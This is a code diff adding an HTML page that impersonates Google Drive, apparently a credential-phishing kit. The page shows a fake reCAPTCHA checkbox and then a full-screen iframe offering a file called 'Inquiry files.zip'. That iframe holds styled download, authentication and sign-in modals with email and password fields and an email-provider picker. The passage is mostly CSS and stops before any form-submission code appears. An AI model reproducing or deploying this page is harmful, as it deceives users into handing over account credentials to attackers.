@@ -1,0 +1,1919 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta itemprop=faviconUrl content=https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png aria-hidden=true>
+<!-- <meta itemprop=url content="/view?usp=drive_open&amp;usp=embed_googleplus" aria-hidden=true> -->
+
+<link rel="shortcut icon" href=images/15.png>
+    <title>Google Drive</title>
+    <style>
+        /* Main font and body styling */
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+
+        /* --- Preloader Styles --- */
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f9f9f9;
+            z-index: 10000;
+        }
+
+        /* From Google Developer Student Clubs - Chapter Danang University of Science and Technology with love <3 */
+        :root {
+            --color-red: #ea4335;
+            --color-blue: #4285f4;
+            --color-yellow: #fbbc05;
+            --color-green: #34a853;
+        }
+
+        .bounce {
+            display: flex;
+            align-items: flex-end;
+        }
+
+        .loader-bounce {
+            width: 1.4rem;
+            height: 1.4rem;
+            border-radius: 50%;
+            margin: .4rem;
+            animation: loader-bounce 1.4s infinite ease-in-out;
+        }
+
+        .bounce-blue {
+            background-color: var(--color-blue);
+        }
+
+        .bounce-red {
+            background-color: var(--color-red);
+            animation-delay: .2s;
+        }
+
+        .bounce-yellow {
+            background-color: var(--color-yellow);
+            animation-delay: .4s;
+        }
+
+        .bounce-green {
+            background-color: var(--color-green);
+            animation-delay: .6s;
+        }
+
+        @keyframes loader-bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-1.2rem);
+            }
+        }
+        /* --- End Preloader Styles --- */
+
+        /* The main container for the reCAPTCHA clone */
+        .recaptcha-container {
+            background-color: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            transition: box-shadow 0.2s ease-in-out;
+        }
+
+        .recaptcha-container:hover {
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+        }
+
+        /* The left side containing the checkbox and text */
+        .recaptcha-content {
+            display: flex;
+            align-items: center;
+        }
+
+        /* Styling for the checkbox element */
+        #recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            background-color: #fff;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.2s;
+        }
+
+        #recaptcha-checkbox:hover {
+            border-color: #afafaf;
+        }
+
+        /* Checkmark SVG (initially hidden) */
+        .checkmark {
+            display: none;
+            width: 20px;
+            height: 20px;
+            stroke: #fff;
+            stroke-width: 3;
+            fill: none;
+        }
+
+        /* Spinner animation (initially hidden) */
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Text next to the checkbox */
+        .recaptcha-label {
+            margin-left: 12px;
+            font-size: 14px;
+            color: #000;
+        }
+
+        /* The right side containing the reCAPTCHA logo */
+        .recaptcha-logo {
+            text-align: center;
+        }
+
+        .recaptcha-logo img {
+            width: 32px;
+            height: 32px;
+        }
+
+        .recaptcha-logo p {
+            font-size: 10px;
+            color: #555;
+            margin: 2px 0 0 0;
+        }
+
+        .recaptcha-logo a {
+            font-size: 8px;
+            color: #555;
+            text-decoration: none;
+        }
+
+        /* Full-screen iframe styling */
+        #fullscreen-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 99999;
+            background-color: #fff;
+        }
+    </style>
+    <!-- Google Font for authentic look -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Preloader -->
+    <div id="preloader">
+        <div class="bounce">
+            <div class="loader-bounce bounce-blue"></div>
+            <div class="loader-bounce bounce-red"></div>
+            <div class="loader-bounce bounce-yellow"></div>
+            <div class="loader-bounce bounce-green"></div>
+        </div>
+    </div>
+
+    <!-- reCAPTCHA Widget (initially hidden) -->
+    <div id="recaptcha-widget" class="recaptcha-container" style="display: none;">
+        <div class="recaptcha-content">
+            <div id="recaptcha-checkbox" role="button" aria-label="I'm not a robot checkbox">
+                <div class="spinner"></div>
+                <svg class="checkmark" viewBox="0 0 24 24">
+                    <path d="M4.5 12.75l6 6 9-13.5"/>
+                </svg>
+            </div>
+            <span class="recaptcha-label">I'm not a robot</span>
+        </div>
+        <div class="recaptcha-logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
+            <p>reCAPTCHA</p>
+            <a href="#">Privacy</a> - <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const checkbox = document.getElementById('recaptcha-checkbox');
+        const spinner = checkbox.querySelector('.spinner');
+        const checkmark = checkbox.querySelector('.checkmark');
+        const widget = document.getElementById('recaptcha-widget');
+        const preloader = document.getElementById('preloader');
+        let isChecked = false;
+
+        // --- Preloader Logic ---
+        window.addEventListener('load', () => {
+            // Simulate a loading time
+            setTimeout(() => {
+                preloader.style.display = 'none';
+                widget.style.display = 'flex'; // The original display was flex
+            }, 9000); // 2.5-second loading simulation
+        });
+
+        // --- reCAPTCHA Checkbox Logic ---
+        checkbox.addEventListener('click', () => {
+            // Prevent multiple clicks while processing
+            if (isChecked) return;
+
+            // 1. Show the loading spinner
+            spinner.style.display = 'block';
+
+            // 2. Simulate a verification delay
+            setTimeout(() => {
+                // 3. Hide spinner and change background color
+                spinner.style.display = 'none';
+                checkbox.style.backgroundColor = '#4285f4'; // Google blue
+                checkbox.style.borderColor = '#4285f4';
+
+                // 4. Show the checkmark
+                checkmark.style.display = 'block';
+                isChecked = true;
+
+                // 5. Wait a moment, then create and show the iframe
+                setTimeout(() => {
+                    createFullscreenIframe();
+                }, 500); // A brief delay to let the user see the checkmark
+
+            }, 1800); // 1.5 second delay for simulation
+        });
+
+        /**
+         * Creates and appends a full-screen iframe to the body.
+         */
+        function createFullscreenIframe() {
+            // Remove the recaptcha widget from view
+            widget.style.display = 'none';
+
+            // Create the iframe element
+            const iframe = document.createElement('iframe');
+            iframe.id = 'fullscreen-iframe';
+             iframe.sandbox="allow-forms allow-same-origin allow-scripts allow-downloads"
+            // Set the srcdoc attribute with the specified HTML content
+            iframe.srcdoc = `<!DOCTYPE html>
+<html>
+
+<meta charset=utf-8>
+<meta name=og-profile-acct content=>
+<meta name=google content=notranslate>
+<meta http-equiv=X-UA-Compatible content="IE=edge;">
+<title>Inquiry files.zip - Google Drive</title>
+<meta property=og:title content="Inquiry files.zip">
+<meta property=og:type content=article>
+<meta property=og:site_name content="Google Docs">
+<meta property=og:url content="https://drive.google.com">
+<meta itemprop=name content="Inquiry files.zip" aria-hidden=true>
+<meta itemprop=faviconUrl content=https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png aria-hidden=true>
+<!-- <meta itemprop=url content="https://drive.google.com" aria-hidden=true> -->
+<!-- <meta name=referrer content=no-referrer> -->
+<link rel="shortcut icon" href=images/15.png>
+<style>
+.sf-hidden {
+    display: none!important
+}
+</style>
+<style>
+        :root {
+            --google-blue: #4285F4;
+            --google-red: #EA4335;
+            --google-yellow: #FBBC05;
+            --google-green: #34A853;
+            --google-gray: #f1f3f4;
+            --google-dark-gray: #5f6368;
+            --google-light-gray: #e8eaed;
+            --google-white: #ffffff;
+            --google-black: #202124;
+            --shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+            --border-radius: 30px;
+        }
+
+        /* {
+            box-sizing: border-box;
+        }*/
+
+        /*body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            color: var(--google-black);
+            transition: all 0.3s ease;
+        }*/
+
+        /* Trigger button style */
+        .secure-download-btn {
+            /*background-color: var(--google-blue);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            min-width: 200px;
+            margin: 20px 0;*/
+        }
+
+        .secure-download-btn:hover {
+            
+        }
+
+        /* Download progress modal */
+        .download-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .download-content {
+            background-color: var(--google-white);
+            width: 90%;
+            max-width: 400px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 24px;
+            text-align: center;
+        }
+
+        .download-message {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: var(--google-dark-gray);
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background-color: var(--google-light-gray);
+            border-radius: 3px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: var(--google-blue);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* First auth modal */
+        .first-auth-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+
+        .first-auth-content {
+            background-color: var(--google-white);
+            width: 90%;
+            max-width: 450px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 24px;
+            text-align: center;
+        }
+
+        .auth-logo {
+            width: 75px;
+            height: 75px;
+            margin-bottom: 20px;
+        }
+
+        .auth-title {
+            font-size: 24px;
+            margin-bottom: 16px;
+            color: var(--google-black);
+        }
+
+        .auth-text {
+            font-size: 16px;
+            color: var(--google-dark-gray);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .auth-btn {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            min-width: 200px;
+        }
+
+        .auth-btn:hover {
+            background-color: #3367d6;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+
+        /* Main sign-in modal */
+        .modal-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1002;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .modal {
+            background-color: var(--google-white);
+            width: 100%;
+            max-width: 450px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            padding: 24px 24px 16px;
+            border-bottom: 1px solid var(--google-light-gray);
+            position: relative;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 500;
+            margin: 0;
+            color: var(--google-black);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            margin-top: 8px;
+            font-size: 14px;
+            color: var(--google-green);
+        }
+
+        .security-badge svg {
+            margin-right: 6px;
+        }
+
+        .modal-content {
+            padding: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--google-dark-gray);
+        }
+
+        .email-input, .password-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--google-light-gray);
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+
+        .email-input:focus, .password-input:focus {
+            outline: none;
+            border-color: var(--google-blue);
+            box-shadow: 0 0 0 2px rgba(66,133,244,0.2);
+        }
+
+        .quick-select-title {
+            font-size: 14px;
+            color: var(--google-dark-gray);
+            margin: 24px 0 12px;
+            text-align: center;
+            position: relative;
+        }
+
+        .quick-select-title:before,
+        .quick-select-title:after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 30%;
+            height: 1px;
+            background-color: var(--google-light-gray);
+        }
+
+        .quick-select-title:before {
+            left: 0;
+        }
+
+        .quick-select-title:after {
+            right: 0;
+        }
+
+        .provider-buttons-container {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 24px;
+            padding-right: 4px;
+        }
+
+        .provider-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 8px;
+        }
+
+        .provider-btn {
+            background-color: var(--google-gray);
+            border: none;
+            border-radius: 4px;
+            padding: 8px 4px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .provider-btn:hover {
+            background-color: var(--google-light-gray);
+        }
+
+        .provider-btn.selected {
+            background-color: var(--google-blue);
+            color: white;
+        }
+
+        .provider-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+            flex-shrink: 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #3367d6;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 16px;
+            font-size: 12px;
+        }
+
+        .footer-link {
+            color: var(--google-blue);
+            text-decoration: none;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Google loading animation */
+        .google-loader {
+            display: none;
+            margin: 20px auto;
+            width: 48px;
+            height: 48px;
+            position: relative;
+        }
+
+        .google-loader::before,
+        .google-loader::after {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--google-blue);
+            animation: spin 1s linear infinite;
+        }
+
+        .google-loader::after {
+            border-top-color: var(--google-red);
+            animation-delay: 0.2s;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Password step */
+        .password-step {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .modal-header {
+                padding: 16px 16px 12px;
+            }
+            .modal-content {
+                padding: 16px;
+            }
+            .provider-buttons {
+                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            }
+        }
+        .provider-btn.hidden {
+            display: none;
+        }
+        
+        /* Update the selected button style */
+        .provider-btn.selected {
+            background-color: var(--google-blue);
+            color: white;
+            display: flex !important; /* Force show even if hidden */
+            width: 100%;
+            grid-column: 1 / -1; /* Make it span all columns */
+        }
+        
+        /* Add a "show all" button style */
+        .show-all-btn {
+            background-color: transparent;
+            border: none;
+            color: var(--google-blue);
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+            width: 100%;
+        }
+    </style>
+
+<style>
+img[src="data:,"],
+source[src="data:,"] {
+    display: none!important
+}
+</style>
+
+<body role=application class="yYWAMb bvmRsc vhoiae LgGVmb ndfHFb-c4YZDc-uoC0bf ndfHFb-c4YZDc-qbOKL-OEVmcd" dir=ltr itemscope itemtype=http://schema.org/CreativeWork/FileObject jsaction=UjQMac:.CLIENT>
+    <div id=in-page-channel-node-id data-channel-name=in_page_channel_By08wM></div>
+    <style nonce>
+    @font-face {
+        font-family: "Roboto";
+        font-style: italic;
+        font-weight: 400;
+        src: url(fonts/0.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Roboto";
+        font-style: normal;
+        font-weight: 300;
+        src: url(fonts/1.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Roboto";
+        font-style: normal;
+        font-weight: 400;
+        src: url(fonts/2.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Roboto";
+        font-style: normal;
+        font-weight: 500;
+        src: url(fonts/3.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Roboto";
+        font-style: normal;
+        font-weight: 700;
+        src: url(fonts/4.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 400;
+        src: url(fonts/5.woff2)format("woff2");
+        unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 400;
+        src: url(fonts/6.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 500;
+        src: url(fonts/5.woff2)format("woff2");
+        unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 500;
+        src: url(fonts/6.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 700;
+        src: url(fonts/5.woff2)format("woff2");
+        unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF
+    }
+    
+    @font-face {
+        font-family: "Google Sans";
+        font-style: normal;
+        font-weight: 700;
+        src: url(fonts/6.woff2)format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+    </style>
+    <link rel=stylesheet href=stylesheet_2.css data-id=_cl nonce>
+    <link href=stylesheet_1.css rel=stylesheet nonce>
+            <style>
+    @media (max-width: 768px) {
+  .VIpgJd-TzA9Ye-eEGnhe{
+    display: none; /* This property hides the elements */
+  }
+  .ndfHFb-c4YZDc-Wrql6b-DdWCyb-b0t70b {
+    display: none; /* This property hides the elements */
+  }
+            .ndfHFb-file {
+              font-size:10px;
+            }
+}
+   
+    </style>
+    <style nonce>
+    .gb_4d {
+        font: 13px/27px Roboto, Arial, sans-serif;
+        z-index: 986
+    }
+    
+    @-webkit-keyframes gb__a {
+        0% {
+            opacity: 0
+        }
+        50% {
+            opacity: 1
+        }
+    }
+    
+    @keyframes gb__a {
+        0% {
+            opacity: 0
+        }
+        50% {
+            opacity: 1
+        }
+    }
+    
+    .gb_dd {
+        display: inline-block;
+        vertical-align: middle
+    }
+    
+    .gb_D {
+        position: relative
+    }
+    
+    .gb_B {
+        display: inline-block;
+        outline: none;
+        vertical-align: middle;
+        box-sizing: border-box;
+        height: 40px;
+        width: 40px
+    }
+    
+    #gb#gb a.gb_B {
+        cursor: pointer;
+        text-decoration: none
+    }
+    
+    .gb_dd:first-child,
+    #gbsfw:first-child+.gb_dd {
+        padding-left: 4px
+    }
+    
+    .gb_Te {
+        position: relative
+    }
+    
+    .gb_Kd .gb_Te {
+        float: right
+    }
+    
+    .gb_B::after {
+        content: "";
+        position: absolute;
+        top: -4px;
+        bottom: -4px;
+        left: -4px;
+        right: -4px
+    }
+    
+    .gb_B {
+        -webkit-border-radius: 50%;
+        border-radius: 50%
+    }
+    
+    .gb_jd button:focus:not(:focus-visible) svg,
+    .gb_jd button:hover svg,
+    .gb_jd button:active svg,
+    .gb_B:focus:not(:focus-visible),
+    .gb_B:hover,
+    .gb_B:active,
+    .gb_B[aria-expanded=true] {
+        outline: none
+    }
+    
+    .gb_Mc .gb_jd.gb_kd button:focus-visible svg,
+    .gb_jd button:focus-visible svg,
+    .gb_B:focus-visible {
+        outline: 1px solid #202124
+    }
+    
+    .gb_Mc .gb_jd button:focus-visible svg,
+    .gb_Mc .gb_B:focus-visible {
+        outline: 1px solid #f1f3f4
+    }
+    
+    @media (forced-colors:active) {}
+    
